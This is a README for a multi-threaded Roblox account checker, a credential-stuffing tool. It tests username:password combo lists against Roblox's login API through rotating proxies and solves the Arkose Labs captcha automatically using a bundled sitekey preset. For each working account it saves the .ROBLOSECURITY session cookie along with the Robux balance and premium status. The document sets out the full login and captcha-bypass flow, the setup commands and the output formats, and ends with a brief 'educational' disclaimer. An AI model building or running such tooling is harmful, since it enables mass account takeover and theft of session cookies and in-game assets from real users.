# Roblox Account Checker

A full-featured, multi-threaded Roblox account checker with integrated Arkose Labs Funcaptcha solving via the `funcaptcha-solver` API.

## Features

- **Accurate Roblox Login API** — Uses `auth.roblox.com/v2/login` with proper CSRF tokens, challenge metadata headers, and captcha provider handling
- **Funcaptcha Integration** — Connects to the local `funcaptcha-solver` API to automatically solve Arkose Labs captcha challenges during login
- **Combo Format** — Simple `username:password` combo file (one per line)
- **Multi-threaded** — Configurable thread count for parallel checking
- **Proxy Support** — Load and rotate HTTP/HTTPS/SOCKS proxies
- **Result Categorization** — Automatically sorts results into:
  - **Hits** — Valid accounts with `.ROBLOSECURITY` cookies
  - **2FA** — Accounts requiring two-step verification
  - **Invalid** — Wrong credentials
  - **Locked** — Banned/suspended accounts
  - **Captcha Failed** — Accounts where captcha could not be solved
  - **Errors** — Unexpected errors
- **Account Enrichment** — For hits, automatically retrieves:
  - Display name
  - User ID
  - Robux balance
  - Premium status
- **Real-time Stats** — Live CPM, hit rate, and category counts
- **Colorized Output** — Easy-to-read terminal output with ANSI colors

## Architecture

```
┌─────────────────┐     ┌──────────────────┐     ┌──────────────────┐
│  combo.txt      │────▶│  Roblox Checker  │────▶│  results/        │
│  user:pass      │     │  (Multi-thread)  │     │  hits.txt        │
└─────────────────┘     │                  │     │  cookies.txt     │
                        │  1. Get CSRF     │     │  2step.txt       │
┌─────────────────┐     │  2. POST login   │     │  invalid.txt     │
│  proxies.txt    │────▶│  3. Handle captcha│    │  locked.txt      │
│  (optional)     │     │  4. Parse result  │    │  captcha_*.txt   │
└─────────────────┘     │  5. Enrich hits   │    │  errors.txt      │
                        └────────┬─────────┘     └──────────────────┘
                                 │
                                 │ Captcha solve requests
                                 ▼
                        ┌──────────────────┐
                        │ funcaptcha-solver│
                        │ (Flask API :8003)│
                        │                  │
                        │ Solves Arkose    │
                        │ Labs Funcaptcha  │
                        │ for Roblox login │
                        └──────────────────┘
```

## Roblox Login API Flow

The checker implements the full Roblox v2 login authentication flow:

1. **CSRF Token** — `POST auth.roblox.com/v2/login` with empty body to obtain `X-CSRF-TOKEN` from response headers
2. **Login Attempt** — `POST auth.roblox.com/v2/login` with:
   ```json
   {
     "ctype": "Username",
     "cvalue": "username",
     "password": "password"
   }
   ```
3. **Captcha Challenge** — If response contains error code 2, extract:
   - `dxBlob` — Base64 blob data for the funcaptcha challenge
   - `unifiedCaptchaId` — The captcha ID for re-submission
4. **Solve Captcha** — Send the blob to `funcaptcha-solver` which:
   - Uses the Roblox login preset (`sitekey: 476068BF-9607-4799-B53D-966BE98E2B81`)
   - Communicates with `arkoselabs.roblox.com`
   - Returns a solved captcha token
5. **Re-submit Login** — POST to `/v2/login` again with:
   - `captchaToken` in the body
   - `captchaProvider: "PROVIDER_ARKOSE_LABS"`
   - `rblx-challenge-metadata` header (base64 JSON with captcha token + ID)
   - `rblx-challenge-id` header
   - `rblx-captcha-type: "Arkose Labs"` header
6. **Parse Result** — Handle success (200 + `.ROBLOSECURITY` cookie), 2FA (code 1), invalid (code 0), locked (code 4)

## Setup

### 1. Install Dependencies

```bash
# Checker dependencies
pip install requests colorama

# Funcaptcha-solver dependencies (see funcaptcha-solver/README.md)
cd funcaptcha-solver
pip install cryptography pycryptodome curl_cffi flask colorama colr PyExecJS jsdom
npm install jsdom
```

### 2. Start the Funcaptcha Solver

```bash
cd funcaptcha-solver
python main.py
```

This starts the solver API on `http://127.0.0.1:8003`.

### 3. Prepare Your Combo File

Create `combo.txt` with one `username:password` entry per line:

```
username1:password123
username2:MyP@ssw0rd!
username3:another_pass
```

### 4. (Optional) Add Proxies

Create `proxies.txt` with one proxy per line. Supported formats:

```
host:port
host:port:user:pass
user:pass@host:port
http://host:port
http://user:pass@host:port
socks5://host:port
```

### 5. Run the Checker

```bash
python run_checker.py -c combo.txt -t 5
```

## Usage

```
python run_checker.py [OPTIONS]

Options:
  -c, --combo       Combo file path (default: combo.txt)
  -p, --proxies     Proxy file path (default: proxies.txt)
  -t, --threads     Number of threads (default: 5)
  --captcha-url     Captcha solver URL (default: http://127.0.0.1:8003)
  --use-proxies     Enable proxy usage
  --no-proxies      Disable proxy usage
  --delay           Delay between checks in seconds (default: 1.0)
```

### Examples

Basic usage with default settings:
```bash
python run_checker.py
```

With custom combo file and 10 threads:
```bash
python run_checker.py -c my_combos.txt -t 10
```

With proxies enabled:
```bash
python run_checker.py -c combo.txt -p proxies.txt --use-proxies -t 3
```

With custom captcha solver URL:
```bash
python run_checker.py --captcha-url http://192.168.1.100:8003
```

## Output Files

Results are saved to the `results/` directory:

| File | Description |
|------|-------------|
| `hits.txt` | Valid accounts with full details (cookie, userID, name, Robux, premium) |
| `cookies.txt` | Just `username \| .ROBLOSECURITY cookie` for easy use |
| `2step.txt` | Accounts requiring two-factor authentication |
| `invalid.txt` | Wrong credentials |
| `locked.txt` | Banned/suspended accounts |
| `captcha_failed.txt` | Accounts where captcha solving failed |
| `errors.txt` | Unexpected errors |

### Hit Format Example

```
username:password | Cookie: LONG_ROBLOSECURITY_COOKIE... | UserID: 12345678 | DisplayName: PlayerName | Robux: 500 | Premium: Yes
```

## Configuration

Edit `roblox_checker/config.py` to customize:

| Setting | Default | Description |
|---------|---------|-------------|
| `MAX_THREADS` | 5 | Number of concurrent checker threads |
| `MAX_CAPTCHA_RETRIES` | 3 | Retries for captcha solving per account |
| `CHECK_DELAY` | 1.0 | Seconds between each check |
| `REQUEST_TIMEOUT` | 30 | HTTP request timeout |
| `CHROME_VERSION` | "130" | Chrome version for fingerprinting |
| `PROXY_ENABLED` | False | Enable/disable proxy usage |

## Funcaptcha Solver Preset

The checker uses the `roblox_login` preset from funcaptcha-solver:

```python
"roblox_login": {
    "siteurl": "https://www.roblox.com",
    "sitekey": "476068BF-9607-4799-B53D-966BE98E2B81",
    "apiurl": "https://arkoselabs.roblox.com",
    "data": {
        "window__ancestor_origins": ["https://www.roblox.com", "https://www.roblox.com"],
        "client_config__sitedata_location_href": "https://www.roblox.com/arkose/iframe",
        "window__tree_structure": "[[],[[]]]",
        "window__tree_index": [0, 0]
    }
}
```

## Error Codes Reference

| Code | Meaning | Checker Action |
|------|---------|----------------|
| 0 | Invalid credentials | Mark as INVALID |
| 1 | Two-step verification required | Mark as 2STEP |
| 2 | Captcha required | Solve captcha and retry login |
| 4 | Account locked/banned | Mark as LOCKED |

## Disclaimer

This tool is for educational and authorized testing purposes only. Unauthorized access to accounts is illegal. Use responsibly and only on accounts you own or have explicit permission to test.